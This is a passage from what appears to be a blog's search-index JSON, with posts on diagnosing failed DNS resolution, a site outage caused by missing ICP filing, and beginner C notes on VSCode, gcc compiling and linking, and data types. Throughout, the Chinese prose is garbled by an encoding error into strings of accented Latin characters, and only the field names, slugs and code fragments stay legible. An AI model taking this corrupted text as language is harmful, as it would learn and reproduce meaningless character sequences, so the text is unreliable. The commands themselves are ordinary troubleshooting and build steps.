åŸŸåè§£æè®°å½•åœ¨DNSè¢«ä¿®æ”¹æˆ–è€…ä¸ç¨³å®šï¼ˆé€šå¸¸æ¥è¯´ï¼Œå¦‚æœä¸Šé¢éƒ½æ˜¯æ­£å¸¸çš„ï¼Œé‚£å°±åªæœ‰è¿™ä¸ªåŸå› äº†ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©æ‰‹åŠ¨è®¾ç½® DNSï¼Œä»è€Œé¿å…è¿è¥å•†è‡ªåŠ¨è·å– DNS ä¸ç¨³å®šç­‰é—®é¢˜ã€‚ ä¸åŒæ“ä½œç³»ç»Ÿè®¾ç½®æ–¹å¼ä¸ä¸€æ ·ï¼Œå…·ä½“æ­¥éª¤å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚ å‚è€ƒé“¾æ¥ ä¸ºä»€ä¹ˆåŸŸåè§£ææˆåŠŸä½†ç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®ï¼Ÿ è§£æä¸ç”Ÿæ•ˆæœ‰å“ªäº›åŸå› ï¼Ÿ ä¸ºä»€ä¹ˆç½‘ç«™æœ‰äº›åœ°åŒºæ— æ³•è®¿é—®?","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"åŸŸåè§£æä¸ç”Ÿæ•ˆæœ‰å“ªäº›åŸå› ","slug":"what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect","date":"2022-05-15T08:26:19.000Z","updated":"2022-05-24T02:20:27.785Z","comments":true,"path":"what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect/","link":"","permalink":"https://www.0x2beace.com/what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect/","excerpt":"åŸŸåè§£æä¸ç”Ÿæ•ˆçš„è¡¨ç°æ˜¯ä½¿ç”¨pingå‘½ä»¤æ— æ³•è·å–æ­£ç¡®çš„åŸŸåè§£æIPåœ°å€ã€‚","text":"åŸŸåè§£æä¸ç”Ÿæ•ˆçš„è¡¨ç°æ˜¯ä½¿ç”¨pingå‘½ä»¤æ— æ³•è·å–æ­£ç¡®çš„åŸŸåè§£æIPåœ°å€ã€‚ è§£æä¸ç”Ÿæ•ˆçš„åŸå› åŒ…æ‹¬: æœ¬åœ°ç½‘ç»œæ•…éšœ äº‘è§£ææœåŠ¡å™¨çš„è§£æè®°å½•å¼‚å¸¸ åŸŸåè§£æè®°å½•åœ¨DNSè¢«ä¿®æ”¹æˆ–è€…ç¼“å­˜ åŸŸåæœªé€šè¿‡å®åè®¤è¯ ä»¥åŸŸå example.com ä¸ºä¾‹ï¼Œæ’é™¤è§£æä¸ç”Ÿæ•ˆå¯é‡‡ç”¨å¦‚ä¸‹æµç¨‹ï¼š 1. æ£€æŸ¥æœ¬åœ°ç½‘ç»œæ˜¯å¦æ­£å¸¸pingå…¶ä»–åŸŸåï¼Œæ£€æŸ¥åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆ? è‹¥ç”Ÿæ•ˆï¼Œåˆ™æ’é™¤æœ¬åœ°ç½‘ç»œé—®é¢˜ã€‚ è‹¥ä¸ç”Ÿæ•ˆï¼Œåˆ™è¡¨ç¤ºæœ¬åœ°ç½‘ç»œæ•…éšœï¼Œè¯·è”ç³»å®½å¸¦è¿è¥å•†è§£å†³ç½‘ç»œæ•…éšœé—®é¢˜ã€‚ 2. æ£€æŸ¥åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆæ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š éªŒè¯NSç±»å‹è§£æï¼šç”¨äºæŒ‡å®šè§£ææœåŠ¡å•†çš„ DNS åœ°å€ã€‚ æŸ¥è¯¢æŒ‡å®šæƒå¨DNSçš„åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆã€‚ å¦‚æœå‘½ä»¤æ‰§è¡Œç»“æœæ˜¾ç¤ºè§£æä¸ç”Ÿæ•ˆï¼Œè¿™æ—¶å¯ä»¥ç™»å½•å¯¹åº”çš„äº‘è§£ææœåŠ¡ç®¡ç†æ§åˆ¶å°ï¼Œæ£€æŸ¥è§£æè®°å½•æ˜¯å¦å¼‚å¸¸ å¦‚æœå‘½ä»¤æ‰§è¡Œç»“æœæ˜¾ç¤ºè§£æç”Ÿæ•ˆï¼Œè¡¨ç¤ºåŸŸåè§£æåœ¨äº‘è§£ææœåŠ¡å™¨æ­£å¸¸ 3. æ£€æŸ¥åŸŸåè§£æè®°å½•æ˜¯å¦è¢«ä¿®æ”¹æˆ–è€…ç¼“å­˜ æ£€æŸ¥åŸŸåæ˜¯å¦ä¿®æ”¹è¿‡DNSæœåŠ¡å™¨ä¿®æ”¹DNSæœåŠ¡å™¨éœ€è¦24å°æ—¶~48å°æ—¶ç”Ÿæ•ˆ æ£€æŸ¥åŸŸåè®°å½•æ˜¯å¦è¢«æœ¬åœ°ç”µè„‘ç¼“å­˜ Windowsæ“ä½œç³»ç»Ÿ:æ‰§è¡Œipconfig /flushdnså‘½ä»¤åˆ·æ–°DNSç¼“å­˜ Linux/Unixæ“ä½œç³»ç»Ÿ:ä¸ä¼šç¼“å­˜DNSè§£æè®°å½•ã€‚ å¦‚æœå®‰è£…äº†nscdç¼“å­˜æœåŠ¡ï¼Œæ‰§è¡Œservice nscd restarté‡å¯æœåŠ¡åˆ·æ–°ç¼“å­˜ã€‚ æ£€æŸ¥è¿è¥å•†æä¾›çš„æœ¬åœ° DNS æœåŠ¡å™¨æ˜¯å¦ç¼“å­˜äº†è§£æè®°å½•åŸŸåè§£æè®°å½•çš„ç¼“å­˜æ—¶é—´é€šå¸¸åœ¨ä¸€ä¸ªå°æ—¶ä¹‹å†…ï¼Œä¹‹åé‡æ–°ä½¿ç”¨pingå‘½ä»¤æ£€æŸ¥ è§£ææ˜¯å¦æ•ˆã€‚ æ£€æŸ¥æœ¬åœ°DNSæ˜¯å¦è¢«åŠ«æŒï¼Œè§£æè®°å½•æ˜¯å¦è¢«ä¿®æ”¹æ‰§è¡Œdig example.com@8.8.8.8æˆ–è€… dig example.com@114.114.114.114å‘½ä»¤ï¼Œæ£€æŸ¥å…¬å…±DNSè§£ææ˜¯å¦ç”Ÿæ•ˆï¼Œå»ºè®®æŠŠæœ¬åœ°dnsæ”¹æˆå…¬å…±dnsã€‚ 4. æ£€æŸ¥åŸŸåæ˜¯å¦å®Œæˆå®åè®¤è¯å¦‚æœåŸŸåæœªè¿›è¡Œå®åè®¤è¯ï¼Œåˆ™åŸŸåä¼šè¢«æ³¨å†Œå±€ä¼šæš‚åœè§£æï¼Œè§£æä¸ç”Ÿæ•ˆã€‚æ›´å¤šé˜…è¯»ä¸ºä»€ä¹ˆåŸŸåè§£ææˆåŠŸä½†ç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®ï¼Ÿ å‚è€ƒé“¾æ¥ è§£æä¸ç”Ÿæ•ˆæœ‰å“ªäº›åŸå› ï¼Ÿ","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"è®°å½•ä¸€æ¬¡ç½‘ç«™æ— æ³•è®¿é—®äº‹ä»¶","slug":"log-a-website-inaccessible-event","date":"2022-05-14T08:53:29.000Z","updated":"2022-05-24T02:20:27.783Z","comments":true,"path":"log-a-website-inaccessible-event/","link":"","permalink":"https://www.0x2beace.com/log-a-website-inaccessible-event/","excerpt":"æœ€è¿‘ç»å†äº†ä¸€æ¬¡å¤§é¢ç§¯ç½‘ç«™æ— æ³•è®¿é—®äº‹ä»¶ï¼Œè¿‡ç¨‹æ¯”è¾ƒé­”å¹»ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ç»å†äº†ä¸€æ¬¡å¤§é¢ç§¯ç½‘ç«™æ— æ³•è®¿é—®äº‹ä»¶ï¼Œè¿‡ç¨‹æ¯”è¾ƒé­”å¹»ï¼Œè®°å½•ä¸€ä¸‹ã€‚ äº”æœˆåäºŒæ—¥æ™šä¸Šå…­ç‚¹åŠï¼Œåˆšåˆšä¸Šçº¿äº†ä¸€ä¸ªç‰ˆæœ¬ï¼Œä»Šå¤©æ˜¯è‡ªå·±ç”Ÿæ—¥ï¼Œæå‰é¢„å®šäº†ä¸€ä¸ªè›‹ç³•ï¼Œå‡†å¤‡ä¸‹ç­äº†ã€‚ æ”¶æ‹¾å¥½æ¡Œé¢ï¼Œå·¦è„šéƒ½å·²ç»ç¦»å¼€å·¥ä½äº†ï¼Œçªç„¶è¢«åŒäº‹å«ä½ï¼Œè¢«å‘ŠçŸ¥ç½‘ç«™æ€ä¹ˆæ‰“ä¸å¼€äº†ï¼Œæˆ‘æƒ³éƒ½æ²¡æƒ³å°±è¯´ï¼Œä½ ç¡®å®šå—ï¼Ÿæˆ‘åˆšåˆšéƒ½è¿˜æ‰“å¼€è¿‡ã€‚ ä»–è¡¨æƒ…å‡é‡çš„å‘Šè¯‰æˆ‘ï¼Œæ˜¯çœŸçš„ã€‚ äºæ˜¯æˆ‘ç†Ÿç»ƒåœ°æ‰“å¼€ç›¸å…³å®¢æˆ·ç«¯ï¼Œåªè§æ»¡å±çš„â€œç½‘ç»œå¼‚å¸¸â€ï¼Œæ­¤æ—¶æˆ‘æ‰æ„è¯†åˆ°å¯èƒ½æ˜¯çœŸçš„å‡ºå¤§é—®é¢˜äº†ã€‚ å› ä¸ºä¸¤åˆ†é’Ÿå‰ï¼Œæˆ‘åˆšä¸Šçº¿äº†ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ‰€ä»¥ç¬¬ä¸€æ—¶é—´æˆ‘ä»¥ä¸ºæ˜¯æ˜¯ä¸æ˜¯æˆ‘è¯¯æ“ä½œäº†ä»€ä¹ˆé€ æˆçš„ï¼Œä¸€ä¸‹å­å°±æ…Œäº†ã€‚ WebServiceã€ç«™ç‚¹ã€DBä¾æ¬¡è¿‡äº†ä¸€éç›¸å…³çš„æ—¥å¿—ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•å¼‚å¸¸ï¼Œæ­¤åˆ»æˆ‘æ›´ä¸å®‰äº†ï¼Œå› ä¸ºæ‰¾ä¸åˆ°é—®é¢˜çš„é—®é¢˜ï¼Œå¾€å¾€æ˜¯æœ€éš¾è§£å†³çš„ã€‚ åŒä¸€ä¸ªæœåŠ¡å™¨ä¸‹é¢çš„å…¶ä»–ç«™ç‚¹éƒ½æ˜¯æ­£å¸¸çš„ï¼Œæ…Œä¹±ä¹‹ä¸­ï¼Œæœ‰æƒ³è¿‡æ˜¯å¦æ˜¯åŸŸåè¿‡æœŸäº†ï¼Œæ’æŸ¥ä¹‹åå‘ç°åŸŸåå¹¶æ²¡æœ‰è¿‡æœŸã€‚ åœ¨ç»è¿‡é•¿è¾¾åŠä¸ªå°æ—¶çš„æ’æŸ¥ä¹‹åï¼Œå‘ç°ç«Ÿç„¶æ˜¯ç½‘ç«™æ²¡æœ‰å¤‡æ¡ˆï¼Œå¯¼è‡´æ•´ä¸ªç«™ç‚¹è¢«åœäº†â€¦ æœ‰äº›äº‹æƒ…å¾€å¾€å°±æ˜¯è¿™ä¹ˆå·§ã€‚ ä¸ºäº†é¿å…ä»¥åå†æ¬¡é‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œæ•´ç†ä¸€ä¸‹ç½‘ç«™æ— æ³•è®¿é—®çš„å¸¸è§æ’æŸ¥æ€è·¯ã€‚ é—®é¢˜æè¿°ç½‘ç«™çš„è®¿é—®ä¸åŸŸåçš„çŠ¶æ€ã€åŸŸåå®åè®¤è¯çŠ¶æ€ã€ç½‘ç«™å¤‡æ¡ˆçŠ¶æ€ã€è§£ææ˜¯å¦ç”Ÿæ•ˆã€ç½‘ç«™ç½‘ç»œç¯å¢ƒç­‰å¤šä¸ªç¯èŠ‚æœ‰å…³ç³»ã€‚åœ¨è¿™äº›ç¯èŠ‚ä¸­ï¼Œä»»æ„ä¸€ä¸ªç¯èŠ‚å‡ºç°é—®é¢˜ï¼Œéƒ½ä¼šå¯¼è‡´ç½‘ç«™æ— æ³•è®¿é—®ã€‚ æ’æŸ¥æ€è·¯ æŸ¥è¯¢åŸŸåæ³¨å†Œä¿¡æ¯ï¼šæ£€æŸ¥åŸŸåæ˜¯å¦è¿‡æœŸã€çŠ¶æ€æ˜¯å¦æ­£å¸¸ æŸ¥çœ‹åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆï¼šæ£€æŸ¥åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆ æŸ¥çœ‹åŸŸåè§£æé…ç½®ï¼šæ£€æŸ¥åŸŸåè§£æé…ç½®æ˜¯å¦æ­£ç¡® æŸ¥çœ‹åŸŸåå¤‡æ¡ˆçŠ¶æ€ï¼šå¯¹äºéƒ¨ç½²åœ¨ä¸­å›½å¤§é™†åŒºåŸŸçš„ç½‘ç«™ï¼Œæ£€æŸ¥æ˜¯å¦é€šè¿‡å¤‡æ¡ˆå®¡æ ¸ æŸ¥çœ‹ç½‘ç«™é…ç½®ï¼šæ£€æŸ¥ç½‘ç«™æœ¬åœ°ç½‘ç»œç¯å¢ƒã€ç½‘ç«™æœåŠ¡å™¨é…ç½®æ˜¯å¦æ­£å¸¸ æäº¤å·¥å• æŸ¥è¯¢åŸŸåæ³¨å†Œä¿¡æ¯é€šå¸¸é€šè¿‡ whois å¹³å°ï¼Œå¯ä»¥æŸ¥è¯¢åŸŸåçš„æ³¨å†Œå•†ã€æ³¨å†Œå‘¨æœŸã€çŠ¶æ€ã€DNSæœåŠ¡å™¨ç­‰æ³¨å†Œä¿¡æ¯ã€‚ é€šè¿‡è¿™äº›ä¿¡æ¯å¯ä»¥å¿«é€Ÿåˆ¤æ–­ï¼Œç½‘ç«™æ— æ³•è®¿é—®æ˜¯å¦ä¸åŸŸåæœ‰å…³ã€‚ å¸¸ç”¨ whois æŸ¥è¯¢å¹³å°ï¼š whoisæŸ¥è¯¢â€”â€”ç«™é•¿ä¹‹å®¶ whoisæŸ¥è¯¢â€”â€”ä¸­å›½ä¸‡ç½‘ whoisæŸ¥è¯¢â€”â€”åä¸ºäº‘ whoisæŸ¥è¯¢â€”â€”é˜¿é‡Œäº‘ æŸ¥çœ‹åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆé€šè¿‡åŸŸåæˆåŠŸè®¿é—®ç½‘ç«™çš„å…¶ä¸­ä¸€ä¸ªæ¡ä»¶æ˜¯ï¼ŒåŸŸååˆ°IPåœ°å€çš„è§£æç”Ÿæ•ˆã€‚å› æ­¤ï¼Œæ£€æŸ¥åŸŸåè§£ææ˜¯å¦æˆåŠŸï¼Œæ˜¯å¿…ä¸å¯å°‘çš„ä¸€æ­¥ã€‚ ä½¿ç”¨æŸ¥è¯¢å‘½ä»¤æ£€æµ‹æ˜¯å¦ç”Ÿæ•ˆ ping nslookup æŸ¥çœ‹åŸŸåè§£æé…ç½®è§£æè®°å½•é…ç½®é”™è¯¯ä¼šå¯¼è‡´æ— æ³•å°†åŸŸåè§£æåˆ°æ­£ç¡®çš„IPåœ°å€ï¼Œä»è€Œå¯¼è‡´ç½‘ç«™æ— æ³•è®¿é—®ã€‚ è¿™ä¸€æ­¥å¾€å¾€éœ€è¦ç™»å½•åˆ°å¯¹åº”çš„æœåŠ¡å™¨çš„æ§åˆ¶å°è¿›è¡ŒæŸ¥çœ‹ï¼Œæ­¤å¤„å°±è·³è¿‡äº†ã€‚ æŸ¥çœ‹åŸŸåå¤‡æ¡ˆçŠ¶æ€å¯¹äºæœåŠ¡å™¨éƒ¨ç½²åœ¨ä¸­å›½å¤§é™†åŒºåŸŸçš„ç½‘ç«™ï¼Œå¦‚æœæœªè¿›è¡Œå¤‡æ¡ˆï¼Œæˆ–è€…å¤‡æ¡ˆå®¡æ ¸æœªé€šè¿‡ï¼Œåˆ™ä¼šå¯¼è‡´ç½‘ç«™è®¿é—®ç½‘ç«™è¢«é˜»æ–­ã€‚ å¸¸ç”¨å¤‡æ¡ˆæŸ¥è¯¢å¹³å°ï¼š ICP/IPåœ°å€/åŸŸåä¿¡æ¯å¤‡æ¡ˆ ç½‘ç«™å¤‡æ¡ˆæŸ¥è¯¢â€”â€”ç«™é•¿å·¥å…· ICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘ æŸ¥çœ‹ç½‘ç«™é…ç½®è‹¥åŸŸåçŠ¶æ€æ­£å¸¸ã€è§£æç”Ÿæ•ˆã€ç½‘ç«™å¤‡æ¡ˆå®¡æ ¸é€šè¿‡ï¼Œç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®ï¼Œéœ€è¦è¿›ä¸€æ­¥æŸ¥çœ‹ç½‘ç«™çš„æœ¬åœ°ç½‘ç»œä»¥åŠç½‘ç«™çš„æœåŠ¡å™¨é…ç½®ã€‚ è¿™ä¸€æ­¥åˆ™æ˜¯æ£€æŸ¥æ˜¯å¦æ˜¯å› ä¸ºæœåŠ¡å™¨è‡ªèº«åŸå› è€Œå¯¼è‡´ä¸å¯ç”¨ï¼ŒåŸå› è¾ƒå¤šï¼Œè¿™é‡Œåªåˆ—ä¸¾å‡ ä¸ªå¸¸è§çš„æ–¹å‘ï¼š è¢«é˜²ç«å¢™æ‹¦æˆª Web Serviceå¼‚å¸¸ æœ¬åœ°ç½‘ç»œæ•…éšœ ç­‰ æäº¤å·¥å•å¦‚æœä¸Šè¿°æ£€æŸ¥å…¨éƒ¨æ²¡æœ‰é—®é¢˜ï¼Œç½‘ç«™ä»ç„¶æ— æ³•è®¿é—®ï¼Œå¯ä»¥å°è¯•è”ç³»å¯¹åº”çš„æœåŠ¡å•†ï¼Œé€šè¿‡æäº¤å·¥å•å¯»æ±‚å¸®åŠ©ã€‚ å‚è€ƒé“¾æ¥ ç½‘ç«™æ— æ³•è®¿é—®æ’æŸ¥æ€è·¯ æ€æ ·æµ‹è¯•åŸŸåè§£ææ˜¯å¦ç”Ÿæ•ˆï¼Ÿ","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"C è¯­è¨€å­¦ä¹ ç¬”è®°","slug":"c-language-study-notes","date":"2022-05-09T14:59:01.000Z","updated":"2022-05-24T02:20:27.781Z","comments":true,"path":"c-language-study-notes/","link":"","permalink":"https://www.0x2beace.com/c-language-study-notes/","excerpt":"ä¸ºä»€ä¹ˆè¦å­¦ä¹  C è¯­è¨€ä¸ºä»€ä¹ˆè¦å­¦ä¹ C è¯­è¨€ï¼ŸC è¯­è¨€æ˜¯æ— å¯æ›¿ä»£çš„å­˜åœ¨ï¼Œæœ‰äº›äº‹æƒ…åªèƒ½æ˜¯C è¯­è¨€æ¥å®Œæˆï¼Œæ¯”å¦‚å†™æ“ä½œç³»ç»Ÿã€‚ å­¦ä¹ C è¯­è¨€çš„ç›®çš„å¹¶ä¸æ˜¯ç²¾é€šCï¼Œè€Œæ˜¯ç†è§£C è¯­è¨€çš„ç¼–è¯‘è¿‡ç¨‹åŠå†…å­˜å˜åŒ–çš„åŸç†ï¼Œä½¿ç”¨C å»ç»ƒä¹ å„ç§æ•°æ®ç»“æ„ã€‚è¿™äº›æ‰æ˜¯å­¦ä¹ C è¯­è¨€çš„ç›®çš„ã€‚","text":"ä¸ºä»€ä¹ˆè¦å­¦ä¹  C è¯­è¨€ä¸ºä»€ä¹ˆè¦å­¦ä¹ C è¯­è¨€ï¼ŸC è¯­è¨€æ˜¯æ— å¯æ›¿ä»£çš„å­˜åœ¨ï¼Œæœ‰äº›äº‹æƒ…åªèƒ½æ˜¯C è¯­è¨€æ¥å®Œæˆï¼Œæ¯”å¦‚å†™æ“ä½œç³»ç»Ÿã€‚ å­¦ä¹ C è¯­è¨€çš„ç›®çš„å¹¶ä¸æ˜¯ç²¾é€šCï¼Œè€Œæ˜¯ç†è§£C è¯­è¨€çš„ç¼–è¯‘è¿‡ç¨‹åŠå†…å­˜å˜åŒ–çš„åŸç†ï¼Œä½¿ç”¨C å»ç»ƒä¹ å„ç§æ•°æ®ç»“æ„ã€‚è¿™äº›æ‰æ˜¯å­¦ä¹ C è¯­è¨€çš„ç›®çš„ã€‚ å¿«é€Ÿä¸Šæ‰‹å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œç¼–å†™ Cè¯­è¨€ç¨‹åºçš„å·¥å…·éå¸¸å¤šï¼š VSCode Sublime Text CLion Xcode Qt Creator æ ¹æ®ä¸ªäººå–œå¥½è¿›è¡Œé€‰æ‹©ï¼Œå‰æœŸå…¥é—¨å»ºè®®ä½¿ç”¨è½»é‡çº§çš„ IDEï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ VSCodeã€‚ .vscodeï¼šåŸºäºå½“å‰å·¥ä½œåŒºç”Ÿæˆçš„é…ç½®æ–‡ä»¶ç›®å½•ï¼Œå…¶ä¸­ä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼š tasks.jsonï¼šç¼–è¯‘å™¨æ„å»ºè®¾ç½® launch.jsonï¼šè°ƒè¯•å™¨è®¾ç½® c_cpp_properties.jsonï¼šç¼–è¯‘å™¨è·¯å¾„å’ŒIntelliSenseè®¾ç½® æ¯æ¬¡åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼ˆDemoï¼‰ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œå› ä¸ºæ¯æ¬¡ç¼–è¯‘è¿è¡Œ.c æ–‡ä»¶ï¼Œéƒ½ä¼šé¢å¤–ç”Ÿæˆä¸€äº›æ–‡ä»¶ï¼š mainï¼šå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ main.dsYMï¼šXcode ç”Ÿæˆçš„æ–‡ä»¶ è¿è¡Œæ­£å¼å¼€å§‹ä¹‹å‰ï¼Œç¡®ä¿æœ¬åœ°ç¯å¢ƒå·²ç»å®‰è£…äº† gcc æˆ–è€…å…¶ä»–ç¼–è¯‘å™¨ã€‚ ä½¿ç”¨ VSCode è¿è¡Œ Cç¨‹åºéå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨å¯¹åº”çš„ Cæ–‡ä»¶ä¸‹ç‚¹å‡»è¿è¡Œæˆ–è€…ä½¿ç”¨ ^F5å³å¯ã€‚ è°ƒè¯•åœ¨æ­£å¼å¼€å§‹è°ƒè¯•ä¹‹å‰ï¼Œéœ€è¦å…ˆå®‰è£…ä¸€ä¸ªæ‰©å±•ï¼š å®‰è£…å®Œæˆä¹‹åï¼Œå°† launch.json ä¸­çš„ type é…ç½®é¡¹æ”¹ä¸º lldbï¼Œå…¶ä»–éƒ¨åˆ†ä¸ç”¨åšä¿®æ”¹ 123456789101112131415161718&#123; \"version\": \"0.2.0\", \"configurations\": [ &#123; \"name\": \"gcc - ç”Ÿæˆå’Œè°ƒè¯•æ´»åŠ¨æ–‡ä»¶\", \"type\": \"lldb\", \"request\": \"launch\", \"program\": \"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;\", \"args\": [], \"stopAtEntry\": false, \"cwd\": \"$&#123;fileDirname&#125;\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"lldb\", \"preLaunchTask\": \"C/C++: gcc ç”Ÿæˆæ´»åŠ¨æ–‡ä»¶\" &#125; ]&#125; è¿™ä¸ªè¡¨ç¤ºé€‰æ‹©å¯¹åº”çš„è°ƒè¯•å™¨ï¼Œåˆšæ‰å®‰è£…çš„ C/C++ å°±æ˜¯ä¸€ä¸ªè°ƒè¯•å™¨ è°ƒè¯•ç¨‹åºéå¸¸ç®€å•ï¼Œåªéœ€è¦åœ¨å¯¹åº”ä»£ç çš„å‰é¢åŠ ä¸Šæ–­ç‚¹ï¼Œç„¶åç‚¹å‡»è°ƒè¯•å³å¯ã€‚ ä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä»…ä»…åªé ç¼–è¯‘æ˜¯æ²¡æœ‰åŠæ³•å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ï¼Œç¼–è¯‘å™¨ç¼–è¯‘ä»…ä»…åªæ˜¯å¾—åˆ°äº†æœ¬åœ°æ–‡ä»¶ï¼Œæœ€ç»ˆæƒ³åˆ°å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜éœ€è¦è¿›è¡Œâ€œé“¾æ¥â€å¤„ç†ã€‚ ç¼–è¯‘åœ¨Windows ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„å¹¶ä¸æ˜¯exeæ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.obj çš„ç›®æ ‡æ–‡ä»¶; åœ¨Unix ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„å¹¶ä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.o çš„ç›®æ ‡æ–‡ä»¶ã€‚ è¿™äº›æ–‡ä»¶æ— æ³•æ‰§è¡Œè¿è¡Œï¼Œå› ä¸ºç¼–è¯‘è¿‡åªæ˜¯æ£€æŸ¥è¯­æ³•ï¼ˆå‡½æ•°ã€å˜æˆå£°æ˜ï¼‰æ˜¯å¦æ­£ç¡®ã€‚ åœ¨Mac ä¸‹ç¼–è¯‘main.c æ–‡ä»¶ï¼š 123gcc -c main.cmain.c main.o é“¾æ¥æ‰¾åˆ°æ‰€è¦ç”¨åˆ°çš„å‡½æ•°æ‰€åœ¨çš„ç›®æ ‡æ–‡ä»¶å¹¶ç»“åˆï¼Œæœ€ç»ˆç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹å°±æ˜¯é“¾æ¥ã€‚æ‰§è¡Œé“¾æ¥çš„ç¨‹åºè¢«æˆä¸ºé“¾æ¥å™¨ã€‚ åœ¨Mac ä¸‹é“¾æ¥ main.c æ–‡ä»¶ï¼š 123gcc main.o -o mainmain.c main.o main å°†ç¼–è¯‘ã€é“¾æ¥åˆå¹¶æˆä¸€æ­¥ï¼š 123gcc main.cmain.c main æ€»ç»“ï¼š main.cï¼šæºä»£ç æ–‡ä»¶ main.oï¼šæºä»£ç æ–‡ä»¶é€šè¿‡ç¼–è¯‘ä¹‹åç”Ÿæˆçš„æœ¬åœ°ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ mainï¼šå¯æ‰§è¡Œæ–‡ä»¶ a.outï¼šå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé»˜è®¤åç§°ï¼‰ æ•°æ®ç±»å‹åœ¨C è¯­è¨€ä¸­ï¼Œæ•°æ®ç±»å‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š åŸºæœ¬ç±»å‹ï¼šæ•´å‹ã€å­—ç¬¦å‹ã€æµ®ç‚¹å‹ æ„é€ ç±»å‹ï¼šæ•°ç»„ç±»å‹ã€ç»“æ„ç±»å‹ã€è”åˆç±»å‹ã€æšä¸¾ç±»å‹ æŒ‡é’ˆç±»å‹ void ç±»å‹ æ•´æ•°ç±»å‹ ç±»å‹ å­˜å‚¨å¤§å° å€¼èŒƒå›´ char 1 å­—èŠ‚ -128 åˆ° 127 æˆ– 0 åˆ° 255 unsigned char 1 å­—èŠ‚ 0 åˆ° 255 signed char 1 å­—èŠ‚ -128 åˆ° 127 int 2 æˆ– 4 å­—èŠ‚ -32,768 åˆ° 32,767 æˆ– -2,147,483,648 åˆ° 2,147,483,647 unsigned int 2 æˆ– 4 å­—èŠ‚ 0 åˆ° 65,535 æˆ– 0 åˆ° 4,294,967,295 short 2 å­—èŠ‚ -32,768 åˆ° 32,767 unsigned short 2 å­—èŠ‚ 0 åˆ° 65,535 long 4 å­—èŠ‚ -2,147,483,648 åˆ° 2,147,483,647 unsigned long 4 å­—èŠ‚ 0 åˆ° 4,294,967,295 æµ®ç‚¹ç±»å‹ ç±»å‹ å­˜å‚¨å¤§å° å€¼èŒƒå›´ ç²¾åº¦ float 4 å­—èŠ‚ 1.2E-38 åˆ° 3.4E+38 6 ä½æœ‰æ•ˆä½ double 8 å­—èŠ‚ 2.3E-308 åˆ° 1.7E+308 15 ä½æœ‰æ•ˆä½ long double 16 å­—èŠ‚ 3.4E-4932 åˆ° 1.1E+4932 19 ä½æœ‰æ•ˆä½ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå„ç§ç±»å‹çš„å­˜å‚¨å¤§å°ä¸ç³»ç»Ÿä½æ•°æœ‰å…³ï¼Œä½†ç›®å‰é€šç”¨çš„ä»¥64ä½ç³»ç»Ÿä¸ºä¸»ã€‚ åœ¨ C 